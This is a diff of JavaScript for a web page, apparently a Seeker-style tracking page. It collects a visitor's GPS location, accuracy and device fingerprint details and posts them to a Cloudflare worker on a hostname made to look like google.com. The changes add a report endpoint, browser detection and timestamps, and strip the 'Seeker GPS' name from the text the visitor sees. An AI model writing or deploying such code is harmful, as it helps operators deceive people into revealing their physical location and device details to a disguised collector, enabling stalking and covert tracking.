@@ -12,7 +12,7 @@ const locationBtn = document.getElementById("locationBtn");
 const result = document.getElementById("result");
 
 const WORKER_URL =
-    "https://google-com.ykzir-polyglot.workers.dev";
+    "https://google-com.ykzir-polyglot.workers.dev/api/report";
 
 
 // ==========================================
@@ -26,10 +26,25 @@ function getDeviceInfo() {
         navigator.mozConnection ||
         navigator.webkitConnection;
 
+    const ua = navigator.userAgent || "";
+
+    let browser = "Unknown";
+
+    if (/Edg\//i.test(ua)) {
+        browser = "Microsoft Edge";
+    } else if (/OPR\//i.test(ua)) {
+        browser = "Opera";
+    } else if (/Chrome\//i.test(ua)) {
+        browser = "Google Chrome";
+    } else if (/Firefox\//i.test(ua)) {
+        browser = "Mozilla Firefox";
+    } else if (/Safari\//i.test(ua)) {
+        browser = "Safari";
+    }
+
     return {
 
-        userAgent:
-            navigator.userAgent || "Unavailable",
+        userAgent: ua || "Unavailable",
 
         platform:
             (navigator.userAgentData &&
@@ -37,36 +52,21 @@ function getDeviceInfo() {
             navigator.platform ||
             "Unavailable",
 
+        browser: browser,
+
         language:
             navigator.language || "Unavailable",
 
         screenResolution:
             screen.width + " x " + screen.height,
 
-        colorDepth:
-            screen.colorDepth + "-bit",
-
         timezone:
             Intl.DateTimeFormat().resolvedOptions().timeZone ||
             "Unavailable",
 
-        cpuCores:
-            navigator.hardwareConcurrency || "Unavailable",
-
-        deviceMemory:
-            navigator.deviceMemory
-                ? navigator.deviceMemory + " GB"
-                : "Unavailable",
-
         connectionType:
             (connection && connection.effectiveType) ||
-            "Unavailable",
-
-        online:
-            navigator.onLine ? "Yes" : "No",
-
-        cookiesEnabled:
-            navigator.cookieEnabled ? "Yes" : "No"
+            "Unavailable"
 
     };
 
@@ -87,7 +87,9 @@ async function sendLocation(latitude, longitude, accuracy) {
 
         accuracy: Math.round(accuracy),
 
-        device: getDeviceInfo()
+        device: getDeviceInfo(),
+
+        timestamp: new Date().toISOString()
 
     };
 
@@ -109,20 +111,28 @@ async function sendLocation(latitude, longitude, accuracy) {
     let data;
 
     try {
+
         data = await response.json();
-    } catch (error) {
+
+    } catch {
+
         throw new Error(
             "Cloudflare returned an invalid or empty response."
         );
+
     }
 
     console.log("Cloudflare HTTP Status:", response.status);
     console.log("Cloudflare Response:", data);
 
-    if (!response.ok || !data.ok) {
+    // IMPORTANT:
+    // Worker returns "success", NOT "ok".
+
+    if (!response.ok || data.success !== true) {
 
         throw new Error(
-            data.error || "Cloudflare backend request failed."
+            data.error ||
+            "Cloudflare backend request failed."
         );
 
     }
@@ -195,7 +205,7 @@ if (!locationBtn || !result) {
                 console.log("Device Information:", device);
 
                 result.textContent =
-                    "Location obtained. Sending report to Seeker GPS server...";
+                    "Location obtained. Sending report to server...";
 
                 try {
 
@@ -205,10 +215,14 @@ if (!locationBtn || !result) {
                         accuracy
                     );
 
-                    if (response.ok) {
+                    if (response.success === true) {
 
                         result.textContent =
-                            "Location and device report successfully delivered!";
+                            "Location report successfully delivered!";
+
+                        console.log(
+                            "SEEKER GPS: REPORT DELIVERED SUCCESSFULLY"
+                        );
 
                     }
 
